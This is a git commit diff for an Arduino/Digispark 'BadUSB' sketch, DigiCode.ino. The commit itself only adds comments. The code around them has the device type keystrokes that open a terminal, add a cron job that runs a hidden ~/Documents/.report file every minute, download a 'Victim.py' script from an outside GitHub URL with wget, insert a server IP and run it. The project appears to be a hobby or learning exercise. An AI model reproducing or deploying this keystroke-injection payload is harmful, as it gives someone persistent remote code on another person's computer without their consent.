b9923c9cace96aaac1e00189dc5598d90110296e
Kaiden-Timm <timm.kaiden09@gmail.com>
2024-06-24 14:28:06 -0600

    Wrote comments in the file

--- DigiCode.ino
+++ DigiCode.ino
@@ -11,6 +11,7 @@ void setup() {
 void loop() {
   // put your main code here, to run repeatedly:
   while(!didRun){
+    //LED turns on when the program starts
     digitalWrite(LED_BUILTIN, HIGH);
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
@@ -22,7 +23,7 @@ void loop() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
-    DigiKeyboard.print("* * * * * python ~/Documents/.report");//python ~/Documents/.report
+    DigiKeyboard.print("* * * * * python ~/Documents/.report");
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
     DigiKeyboard.delay(500);
@@ -33,6 +34,7 @@ void loop() {
     DigiKeyboard.println("cd ~/Documents; wget -O .report https://raw.githubusercontent.com/Kaiden-Timm/DigiKeyboard-project/main/Victim.py");
     //6, 15
     DigiKeyboard.delay(500);
+    //Wrote for nano, not really sure why but you can change it to vim by changing nano to vim and adding an I keypress before you write the server IP into the file
     DigiKeyboard.println("nano ~/Documents/.report");
     for(int i = 0; i < 6; i++){
       DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
@@ -51,6 +53,7 @@ void loop() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     DigiKeyboard.println("python ~/Documents/.report");
+    //LED turns off when its done
     digitalWrite(LED_BUILTIN, LOW);
     didRun = true;
   }
